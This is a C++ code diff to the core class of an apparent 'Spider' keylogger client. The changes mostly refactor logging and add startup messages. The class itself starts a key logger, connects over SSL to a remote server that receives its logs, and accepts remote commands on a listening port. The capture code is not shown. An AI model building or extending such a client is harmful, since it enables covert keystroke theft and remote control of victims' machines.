@@ -5,6 +5,7 @@
 #ifndef SPIDER_CLIENT_CSPIDERCORE_HPP
 #define SPIDER_CLIENT_CSPIDERCORE_HPP
 
+#include <log/Logger.hpp>
 #include <Network/SSLConnection.hpp>
 #include <Network/ClientSession.hpp>
 #include <Network/TCPAcceptor.hpp>
@@ -20,27 +21,36 @@ namespace spi
     class CSpiderCore
     {
     public:
-        CSpiderCore(cfg::Config &conf) :_conf(conf),
-                                        _clientSession(_ctx, _io, conf)
-        {}
+        explicit CSpiderCore(cfg::Config &conf) : _conf(conf),
+                                                  _clientSession(_ctx, _io, conf),
+                                                  _logHandle(fs::path(conf.logDir))
+        {
+            _log(logging::Info) << "Configuring Spider Client" << std::endl;
+            _log(logging::Info) << "Using remote server " << conf.address << ":" << conf.port << std::endl;
+            _log(logging::Info) << "Using port " << conf.portAcceptor << " for remote commands" << std::endl;
+            _log(logging::Info) << "Using SSL certificate " << conf.certFile << std::endl;
+            _log(logging::Info) << "Using SSL private key " << conf.keyFile << std::endl;
+            _log(logging::Info) << "Using '" << conf.logDir << "' to store logs" << std::endl;
+        }
 
         ~CSpiderCore()
         {
-            _log(lg::Info) << "Shutting down..." << std::endl;
+            _log(logging::Info) << "Shutting down" << std::endl;
             _keyLogger->stop();
             delete _sess;
         }
 
         bool run()
         {
+            _log(logging::Debug) << "Starting now" << std::endl;
             __setupSigHandlers();
             __setup();
             __startAcceptor();
-            _log(lg::Info) << "Starting..." << std::endl;
             _keyLogger->run();
             _clientSession.onConnect(boost::bind(&CSpiderCore::__setupLogHandleConnection,
-                                                  this, net::ErrorPlaceholder));
+                                                 this, net::ErrorPlaceholder));
             _clientSession.connect();
+            _log(logging::Info) << "Client started successfully" << std::endl;
             _io.run();
             return true;
         }
@@ -51,14 +61,14 @@ namespace spi
         }
 
     private:
-        void __setupSigHandlers()
+        void __setupSigHandlers() noexcept
         {
             _io.onTerminationSignals(boost::bind(&CSpiderCore::stop, this));
         }
 
         void __setupLogHandleConnection(net::SSLConnection *sslConnection)
         {
-            _logHandle.connect(sslConnection);
+            _logHandle.setConnection(sslConnection);
         }
 
         void __handleAccept(const ErrorCode &ec)
@@ -67,7 +77,7 @@ namespace spi
                 _sess->onError(boost::bind(&CSpiderCore::__removeSession, this, _1));
                 _sess->startSession();
             } else {
-                _log(lg::Level::Warning) << "Unable to accept a command connection: " << ec.message() << std::endl;
+                _log(logging::Level::Warning) << "Unable to accept a command connection: " << ec.message() << std::endl;
                 __startAcceptor();
             }
         }
@@ -118,7 +128,7 @@ namespace spi
 
         KeyLogPtr _keyLogger{Factory::createKeyLogger(_io)};
 
-        lg::Logger _log{"client-spider", lg::Level::Debug};
+        logging::Logger _log{"client-spider", logging::Level::Debug};
     };
 }
 
